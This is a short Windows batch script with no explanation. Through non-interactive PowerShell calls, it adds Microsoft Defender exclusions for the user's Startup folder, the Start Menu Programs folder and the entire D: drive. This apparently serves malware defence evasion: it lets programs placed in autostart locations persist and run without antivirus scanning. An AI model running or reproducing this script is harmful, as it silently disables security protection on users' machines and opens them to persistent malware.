@echo off
cls
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs'"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'D:\'"